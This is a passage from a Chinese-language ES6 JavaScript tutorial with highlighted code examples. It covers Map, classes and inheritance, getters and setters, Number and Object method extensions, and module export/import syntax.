class_">Map</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//添加元素</span></span><br><span class="line">m.<span class="title function_">set</span>(<span class="string">&#x27;name&#x27;</span>,<span class="string">&#x27;尚硅谷&#x27;</span>); <span class="comment">// &#123; key: name,value: 尚硅谷 &#125;</span></span><br><span class="line">m.<span class="title function_">set</span>(<span class="string">&#x27;change&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;我们可以改变你!!&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">let</span> key = &#123;</span><br><span class="line">  school : <span class="string">&#x27;ATGUIGU&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line">m.<span class="title function_">set</span>(key, [<span class="string">&#x27;北京&#x27;</span>,<span class="string">&#x27;上海&#x27;</span>,<span class="string">&#x27;深圳&#x27;</span>]); &#123;<span class="attr">key</span>: &#123;school : <span class="string">&#x27;ATGUIGU&#x27;</span>&#125;, <span class="attr">value</span>: [<span class="string">&#x27;北京&#x27;</span>,<span class="string">&#x27;上海&#x27;</span>,<span class="string">&#x27;深圳&#x27;</span>]&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//size</span></span><br><span class="line"><span class="comment">// console.log(m.size); // 3</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//删除</span></span><br><span class="line"><span class="comment">// m.delete(&#x27;name&#x27;); </span></span><br><span class="line"></span><br><span class="line"><span class="comment">//获取</span></span><br><span class="line"><span class="comment">// console.log(m.get(&#x27;change&#x27;));</span></span><br><span class="line"><span class="comment">// console.log(m.get(key));</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//清空</span></span><br><span class="line"><span class="comment">// m.clear();</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//遍历</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> v <span class="keyword">of</span> m)&#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(v); <span class="comment">// [&#x27;name&#x27;, 尚硅谷] ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// console.log(m);</span></span><br></pre></td></tr></table></figure><hr><h2 id="class-类"><a href="#class-类" class="headerlink" title="class 类"></a>class 类</h2><p><strong>ES6 提供了更接近传统语言的写法，引入了 <code>Class（类）</code>这个概念，作为对象的模板。通过 <code>class 关键字</code>，可以<code>定义类</code>。基本上，ES6 的 class 可以看作只是一个语法糖，它的绝大部分功能，ES5 都可以做到，新的 class 写法只是让对象原型的写法更加清晰、更像面向对象编程的语法而已。</strong><br><strong>知识点：</strong></p><ul><li><ol><li>class 声明类</li></ol></li><li><ol start="2"><li>constructor 定义构造函数初始化</li></ol></li><li><ol start="3"><li>extends 继承父类</li></ol></li><li><ol start="4"><li>super 调用父级构造方法</li></ol></li><li><ol start="5"><li>static 定义静态方法和属性</li></ol></li><li><ol start="6"><li>父类方法可以重写</li></ol></li></ul><h3 id="class介绍"><a href="#class介绍" class="headerlink" title="class介绍"></a>class介绍</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*********** ES5 **********/</span></span><br><span class="line"><span class="comment">//手机</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Phone</span>(<span class="params">brand, price</span>)&#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">brand</span> = brand;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">price</span> = price;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//添加方法</span></span><br><span class="line"><span class="title class_">Phone</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">call</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;我可以打电话!!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//实例化对象</span></span><br><span class="line"><span class="keyword">let</span> <span class="title class_">Huawei</span> = <span class="keyword">new</span> <span class="title class_">Phone</span>(<span class="string">&#x27;华为&#x27;</span>, <span class="number">5999</span>);</span><br><span class="line"><span class="title class_">Huawei</span>.<span class="title function_">call</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Huawei</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*********** ES6 **********/</span></span><br><span class="line"><span class="comment">//class</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Shouji</span>&#123;</span><br><span class="line">  <span class="comment">//构造方法 名字不能修改</span></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">brand, price</span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">brand</span> = brand;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">price</span> = price;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//对象方法必须使用该语法, 不能使用 ES5 的对象完整形式</span></span><br><span class="line">  <span class="title function_">call</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;我可以打电话!!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> onePlus = <span class="keyword">new</span> <span class="title class_">Shouji</span>(<span class="string">&quot;1+&quot;</span>, <span class="number">1999</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(onePlus)</span><br></pre></td></tr></table></figure><h3 id="class静态成员"><a href="#class静态成员" class="headerlink" title="class静态成员"></a>class静态成员</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*********** ES5 **********/</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Phone</span>(<span class="params"></span>)&#123;&#125;</span><br><span class="line"><span class="comment">// name是函数对象上属性</span></span><br><span class="line"><span class="title class_">Phone</span>.<span class="property">name</span> = <span class="string">&#x27;手机&#x27;</span>;</span><br><span class="line"><span class="title class_">Phone</span>.<span class="property">change</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;我可以改变世界&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">Phone</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">size</span> = <span class="string">&#x27;5.5inch&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// nokia实例对象没有构造函数Phone对象上的属性</span></span><br><span class="line"><span class="keyword">let</span> nokia = <span class="keyword">new</span> <span class="title class_">Phone</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(nokia.<span class="property">name</span>); <span class="comment">// undefined</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(nokia.<span class="property">size</span>); <span class="comment">// 5.5inch</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*********** ES6 **********/</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Phone</span>&#123;</span><br><span class="line">  <span class="comment">//静态属性</span></span><br><span class="line">  <span class="keyword">static</span> name = <span class="string">&#x27;手机&#x27;</span>;</span><br><span class="line">  <span class="keyword">static</span> <span class="title function_">change</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;我可以改变世界&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> nokia = <span class="keyword">new</span> <span class="title class_">Phone</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(nokia.<span class="property">name</span>); <span class="comment">// undefined</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Phone</span>.<span class="property">name</span>); <span class="comment">// 手机</span></span><br></pre></td></tr></table></figure><h3 id="ES5构造函数继承"><a href="#ES5构造函数继承" class="headerlink" title="ES5构造函数继承"></a>ES5构造函数继承</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//手机  //父类</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Phone</span>(<span class="params">brand, price</span>)&#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">brand</span> = brand;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">price</span> = price;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Phone</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">call</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;我可以打电话&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//智能手机 //子类</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">SmartPhone</span>(<span class="params">brand, price, color, size</span>)&#123;</span><br><span class="line">  <span class="title class_">Phone</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>, brand, price);</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">color</span> = color;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">size</span> = size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//设置子级构造函数的原型</span></span><br><span class="line"><span class="title class_">SmartPhone</span>.<span class="property"><span class="keyword">prototype</span></span> = <span class="keyword">new</span> <span class="title class_">Phone</span>;</span><br><span class="line"><span class="title class_">SmartPhone</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">constructor</span> = <span class="title class_">SmartPhone</span>; <span class="comment">// 矫正</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//声明子类的方法</span></span><br><span class="line"><span class="title class_">SmartPhone</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">photo</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;我可以拍照&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">SmartPhone</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">playGame</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;我可以玩游戏&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> chuizi = <span class="keyword">new</span> <span class="title class_">SmartPhone</span>(<span class="string">&#x27;锤子&#x27;</span>,<span class="number">2499</span>,<span class="string">&#x27;黑色&#x27;</span>,<span class="string">&#x27;5.5inch&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(chuizi);</span><br></pre></td></tr></table></figure><h3 id="class类的继承"><a href="#class类的继承" class="headerlink" title="class类的继承"></a>class类的继承</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Phone</span>&#123;</span><br><span class="line">  <span class="comment">//构造方法</span></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">brand, price</span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">brand</span> = brand;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">price</span> = price;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//父类的成员属性</span></span><br><span class="line">  <span class="title function_">call</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;我可以打电话!!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 子类SmartPhone继承父类Phone中的属性和方法</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SmartPhone</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Phone</span> &#123;</span><br><span class="line">  <span class="comment">//构造方法</span></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">brand, price, color, size</span>)&#123;</span><br><span class="line">    <span class="variable language_">super</span>(brand, price);<span class="comment">// Phone.call(this, brand, price)</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">color</span> = color;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">size</span> = size;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">photo</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;拍照&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">playGame</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;玩游戏&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//方法重写,子类不可以直接调用父类的重名方法</span></span><br><span class="line">  <span class="title function_">call</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;我可以进行视频通话&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">static</span> <span class="title function_">connect</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;我可以建立连接&#x27;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//实例化对象</span></span><br><span class="line"><span class="keyword">const</span> xiaomi = <span class="keyword">new</span> <span class="title class_">SmartPhone</span>(<span class="string">&#x27;小米&#x27;</span>,<span class="number">799</span>,<span class="string">&#x27;黑色&#x27;</span>,<span class="string">&#x27;4.7inch&#x27;</span>);</span><br><span class="line"><span class="comment">//调用子类方法</span></span><br><span class="line">xiaomi.<span class="title function_">playGame</span>();</span><br><span class="line"><span class="comment">//调用重写方法</span></span><br><span class="line">xiaomi.<span class="title function_">call</span>();</span><br><span class="line"><span class="comment">//调用静态方法</span></span><br><span class="line"><span class="title class_">SmartPhone</span>.<span class="title function_">connect</span>();</span><br></pre></td></tr></table></figure><h3 id="class的get和set"><a href="#class的get和set" class="headerlink" title="class的get和set"></a>class的get和set</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// get 和 set  </span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Phone</span>&#123;</span><br><span class="line">  <span class="keyword">get</span> <span class="title function_">price</span>()&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;价格属性被读取了&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;iloveyou&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 函数必须有参数</span></span><br><span class="line">  <span class="keyword">set</span> <span class="title function_">price</span>(<span class="params">newVal</span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(newVal);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;价格属性被修改了&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//实例化对象</span></span><br><span class="line"><span class="keyword">let</span> s = <span class="keyword">new</span> <span class="title class_">Phone</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(s.<span class="property">price</span>); <span class="comment">// 价格属性被读取了 iloveyou</span></span><br><span class="line">s.<span class="property">price</span> = <span class="string">&#x27;free&#x27;</span>; <span class="comment">// free 价格属性被修改了</span></span><br></pre></td></tr></table></figure><hr><h2 id="ES6的数值扩展"><a href="#ES6的数值扩展" class="headerlink" title="ES6的数值扩展"></a>ES6的数值扩展</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1. Number.EPSILON 是 JavaScript 表示的最小精度</span></span><br><span class="line"><span class="comment">// EPSILON 属性的值接近于 2.2204460492503130808472633361816E-16</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">equal</span>(<span class="params">a, b</span>)&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="title class_">Math</span>.<span class="title function_">abs</span>(a-b) &lt; <span class="title class_">Number</span>.<span class="property">EPSILON</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">0.1</span> + <span class="number">0.2</span> === <span class="number">0.3</span>); <span class="comment">// false</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">equal</span>(<span class="number">0.1</span> + <span class="number">0.2</span>, <span class="number">0.3</span>)) <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 2.二进制和八进制</span></span><br><span class="line"><span class="keyword">let</span> b = <span class="number">0b1010</span>; <span class="comment">// 二进制 10</span></span><br><span class="line"><span class="keyword">let</span> o = <span class="number">0o777</span>; <span class="comment">// 八进制 511</span></span><br><span class="line"><span class="keyword">let</span> d = <span class="number">100</span>; <span class="comment">// 十进制 100</span></span><br><span class="line"><span class="keyword">let</span> x = <span class="number">0xff</span>; <span class="comment">// 十六进制 255</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 3.Number.isFinite  检测一个数值是否为有限数</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Number</span>.<span class="built_in">isFinite</span>(<span class="number">100</span>)); <span class="comment">// true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Number</span>.<span class="built_in">isFinite</span>(<span class="number">100</span>/<span class="number">0</span>)); <span class="comment">// false</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Number</span>.<span class="built_in">isFinite</span>(<span class="title class_">Infinity</span>)); <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 4.Number.isNaN 检测一个数值是否为 NaN </span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Number</span>.<span class="built_in">isNaN</span>(<span class="number">123</span>)); <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 5.Number.parseInt Number.parseFloat字符串转整数</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Number</span>.<span class="built_in">parseInt</span>(<span class="string">&#x27;5211314love&#x27;</span>)); <span class="comment">// 5211314</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Number</span>.<span class="built_in">parseFloat</span>(<span class="string">&#x27;3.1415926神奇&#x27;</span>)); <span class="comment">// 3.1415926</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 6.Number.isInteger 判断一个数是否为整数</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Number</span>.<span class="title function_">isInteger</span>(<span class="number">5</span>)); <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 7.Math.trunc 将数字的小数部分抹掉  </span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Math</span>.<span class="title function_">trunc</span>(<span class="number">3.5</span>)); <span class="comment">// 3</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 8. Math.sign 判断一个数到底为正数 负数 还是零</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Math</span>.<span class="title function_">sign</span>(<span class="number">100</span>)); <span class="comment">// 1</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Math</span>.<span class="title function_">sign</span>(<span class="number">0</span>)); <span class="comment">// 0</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Math</span>.<span class="title function_">sign</span>(-<span class="number">20000</span>)); <span class="comment">// -1</span></span><br></pre></td></tr></table></figure><hr><h2 id="ES6的对象方法扩展"><a href="#ES6的对象方法扩展" class="headerlink" title="ES6的对象方法扩展"></a>ES6的对象方法扩展</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1. Object.is 比较两个值是否严格相等，与『===』行为基本一致</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Object</span>.<span class="title function_">is</span>(<span class="number">120</span>, <span class="number">120</span>)); <span class="comment">// true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Object</span>.<span class="title function_">is</span>(<span class="title class_">NaN</span>, <span class="title class_">NaN</span>)); <span class="comment">// true </span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Object</span>.<span class="title function_">is</span>(+<span class="number">0</span>, -<span class="number">0</span>)); <span class="comment">// false</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Object</span>.<span class="title function_">is</span>(+<span class="number">0</span>, <span class="number">0</span>)); <span class="comment">// true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">NaN</span> === <span class="title class_">NaN</span>); <span class="comment">// false</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(+<span class="number">0</span> === -<span class="number">0</span>); <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 2.Object.assign 对象的合并</span></span><br><span class="line"><span class="keyword">const</span> config1 = &#123;</span><br><span class="line">  <span class="attr">host</span>: <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">  <span class="attr">port</span>: <span class="number">3306</span>,</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line">  <span class="attr">pass</span>: <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line">  <span class="attr">test</span>: <span class="string">&#x27;test&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">const</span> config2 = &#123;</span><br><span class="line">  <span class="attr">host</span>: <span class="string">&#x27;http://atguigu.com&#x27;</span>,</span><br><span class="line">  <span class="attr">port</span>: <span class="number">33060</span>,</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;atguigu.com&#x27;</span>,</span><br><span class="line">  <span class="attr">pass</span>: <span class="string">&#x27;iloveyou&#x27;</span>,</span><br><span class="line">  <span class="attr">test2</span>: <span class="string">&#x27;test2&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 后面对象会覆盖与前面对象属性名形同的属性值，前后对象不同的将会保留</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Object</span>.<span class="title function_">assign</span>(config1, config2));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3.Object.setPrototypeOf 设置原型对象  Object.getPrototypeof</span></span><br><span class="line"><span class="comment">// __proto__、setPrototypeOf、 getPrototypeOf 可以直接设置对象的原型</span></span><br><span class="line"><span class="keyword">const</span> school = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;尚硅谷&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> cities = &#123;</span><br><span class="line">  <span class="attr">xiaoqu</span>: [<span class="string">&#x27;北京&#x27;</span>,<span class="string">&#x27;上海&#x27;</span>,<span class="string">&#x27;深圳&#x27;</span>]</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">setPrototypeOf</span>(school, cities); <span class="comment">// 设置原型对象</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Object</span>.<span class="title function_">getPrototypeOf</span>(school)); <span class="comment">// 获取原型对象</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(school);</span><br></pre></td></tr></table></figure><hr><h2 id="模块化"><a href="#模块化" class="headerlink" title="模块化"></a>模块化</h2><h3 id="模块化介绍"><a href="#模块化介绍" class="headerlink" title="模块化介绍"></a>模块化介绍</h3><p><strong>模块化是指将一个大的程序文件，拆分成许多小的文件，然后将小文件组合起来</strong><br><strong>模块化的优势有以下几点：</strong></p><ul><li><ol><li>防止命名冲突</li></ol></li><li><ol start="2"><li>代码复用</li></ol></li><li><ol start="3"><li>高维护性</li></ol></li></ul><p><strong>ES6 之前的模块化规范有：</strong></p><ul><li><ol><li>CommonJS =&gt; NodeJS、Browserify</li></ol></li><li><ol start="2"><li>AMD =&gt; requireJS</li></ol></li><li><ol start="3"><li>CMD =&gt; seaJS</li></ol></li></ul><p><strong>模块功能主要由两个命令构成：export 和 import</strong> </p><ul><li>export 命令用于规定模块的对外接口<ul><li>分别暴露</li><li>统一暴露</li><li>默认暴露</li></ul></li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// m1.js文件</span></span><br><span class="line"><span class="comment">// 分别暴露</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">let</span> school = <span class="string">&#x27;尚硅谷&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">teach</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;我们可以教给你开发技能&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// m2.js文件</span></span><br><span class="line"><span class="comment">// 统一暴露</span></span><br><span class="line"><span class="keyword">let</span> school = <span class="string">&#x27;尚硅谷&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">findJob</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;我们可以帮助你找工作!!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> &#123;school, findJob&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// m3.js文件</span></span><br><span class="line"><span class="comment">// 默认暴露</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  <span class="attr">school</span>: <span class="string">&#x27;ATGUIGU&#x27;</span>,</span><br><span class="line">  <span class="attr">change</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;我们可以改变你!!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 引入 m1.js 模块内容，* --&gt; mi文件中的所有内容存在对象中</span></span><br><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> m1 <span class="keyword">from</span> <span class="string">&quot;./src/js/m1.js&quot;</span>;</span><br><span class="line"><span class="comment">// &#123;school: &#x27;尚硅谷&#x27;, teach: function(...)&#125;</span></span><br><span class="line">m1.<span class="title function_">teach</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 引入 m2.js 模块内容</span></span><br><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> m2 <span class="keyword">from</span> <span class="string">&quot;./src/js/m2.js&quot;</span>;</span><br><span class="line">m2.<span class="title function_">findJob</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 引入 m3.js</span></span><br><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> m3 <span class="keyword">from</span> <span class="string">&quot;./src/js/m3.js&quot;</span>;</span><br><span class="line">m3.<span class="property">default</span>.<span class="title function_">change</span>()</span><br></pre></td></tr></table></figure><ul><li>import 命令用于输入其他模块提供的功能<ul><li>通用的导入方式，* 引入文件中所有内容，放到对象中</li><li>解构赋值形式，as + 别名：给引入文件中的属性起别名，解决属性名重复问题</li><li>简便形式，针对默认暴露</li></ul></li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 通用的导入方式， * 引入文件中所有内容，放到对象中</span></span><br><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> m1 <span class="keyword">from</span> <span class="string">&quot;./src/js/m1.js&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 解构赋值形式,</span></span><br><span class="line"><span class="keyword">import</span> &#123;school, teach&#125; <span class="keyword">from</span> <span class="string">&quot;./src/js/m1.js&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123;school <span class="keyword">as</span> guigu, findJob&#125; <span class="keyword">from</span> <span class="string">&quot;./src/js/m2.js&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123;<span class="keyword">default</span> <span class="keyword">as</span> m3&#125; <span class="keyword">from</span> <span class="string">&quot;./src/js/m3.js&quot;</span>; <span class="comment">// 固定写法，default是一个对象，需要起别名</span></span><br><span class="line"><span class="title function_">teach</span>()</span><br><span class="line">m3.<span class="title function_">change</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">//3. 简便形式  针对默认暴露</span></span><br><span class="line"><span class="keyword">import</span> m3 <span class="keyword">from</span> <span 